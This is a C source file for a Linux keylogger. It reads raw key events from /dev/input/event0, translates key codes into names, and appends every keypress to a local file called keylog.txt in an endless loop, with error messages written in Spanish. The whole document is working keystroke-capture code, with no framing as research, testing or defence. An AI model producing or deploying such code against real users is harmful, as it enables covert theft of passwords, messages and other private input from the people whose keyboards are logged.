#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#define INPUT_DEVICE "/dev/input/event0"

const char *get_key_name(int code) {
    switch(code) {
        case 1: return "[ESC]";
        case 2: return "1";
        case 3: return "2";
        case 4: return "3";
        case 5: return "4";
        case 6: return "5";
        case 7: return "6";
        case 8: return "7";
        case 9: return "8";
        case 10: return "9";
        case 11: return "0";
        case 12: return "-";
        case 13: return "=";
        case 14: return "[BACKSPACE]";
        case 15: return "[TAB]";
        case 16: return "Q";
        case 17: return "W";
        case 18: return "E";
        case 19: return "R";
        case 20: return "T";
        case 21: return "Y";
        case 22: return "U";
        case 23: return "I";
        case 24: return "O";
        case 25: return "P";
        case 26: return "[";
        case 27: return "]";
        case 28: return "[ENTER]";
        case 29: return "[CTRL]";
        case 30: return "A";
        case 31: return "S";
        case 32: return "D";
        case 33: return "F";
        case 34: return "G";
        case 35: return "H";
        case 36: return "J";
        case 37: return "K";
        case 38: return "L";
        case 39: return ";";
        case 40: return "'";
        case 41: return "`";
        case 42: return "[SHIFT]";
        case 43: return "\\";
        case 44: return "Z";
        case 45: return "X";
        case 46: return "C";
        case 47: return "V";
        case 48: return "B";
        case 49: return "N";
        case 50: return "M";
        case 51: return ",";
        case 52: return ".";
        case 53: return "/";
        case 54: return "[SHIFT]";
        case 55: return "[PRTSC]";
        case 56: return "[ALT]";
        case 57: return " ";
        case 58: return "[CAPSLOCK]";
        case 59: return "[F1]";
        case 60: return "[F2]";
        case 61: return "[F3]";
        case 62: return "[F4]";
        case 63: return "[F5]";
        case 64: return "[F6]";
        case 65: return "[F7]";
        case 66: return "[F8]";
        case 67: return "[F9]";
        case 68: return "[F10]";
        case 69: return "[NUMLOCK]";
        case 70: return "[SCROLLLOCK]";
        case 71: return "[KP_7]";
        case 72: return "[KP_8]";
        case 73: return "[KP_9]";
        case 74: return "[KP_-]";
        case 75: return "[KP_4]";
        case 76: return "[KP_5]";
        case 77: return "[KP_6]";
        case 78: return "[KP_+]";
        case 79: return "[KP_1]";
        case 80: return "[KP_2]";
        case 81: return "[KP_3]";
        case 82: return "[KP_0]";
        case 83: return "[KP_.]";
        case 87: return "[F11]";
        case 88: return "[F12]";
        case 96: return "[KP_ENTER]";
        case 97: return "[RIGHT_CTRL]";
        case 98: return "[KP_/]";
        case 100: return "[RIGHT_ALT]";
        case 102: return "[HOME]";
        case 103: return "[UP]";
        case 104: return "[PAGE_UP]";
        case 105: return "[LEFT]";
        case 106: return "[RIGHT]";
        case 107: return "[END]";
        case 108: return "[DOWN]";
        case 109: return "[PAGE_DOWN]";
        case 110: return "[INSERT]";
        case 111: return "[DELETE]";
        case 119: return "[PAUSE]";
        default: return "[UNKNOWN]";
    }
}

int main() {
    struct input_event ev;
    int fd;
    FILE *fp;

    fd = open(INPUT_DEVICE, O_RDONLY);
    if (fd == -1) {
        perror("Error al abrir el dispositivo de entrada");
        return EXIT_FAILURE;
    }

    fp = fopen("keylog.txt", "a");
    if (fp == NULL) {        perror("Error al abrir el archivo");
        close(fd);
        return EXIT_FAILURE;
    }

    while (1) {
        read(fd, &ev, sizeof(struct input_event));
        if (ev.type == EV_KEY && ev.value == 1) { // Solo detecta cuando se presiona la tecla
            const char *key = get_key_name(ev.code);
            if (key) {
                fprintf(fp, "%s", key);
                fflush(fp);
            }
        }
    }

    fclose(fp);
    close(fd);
    return EXIT_SUCCESS;
}
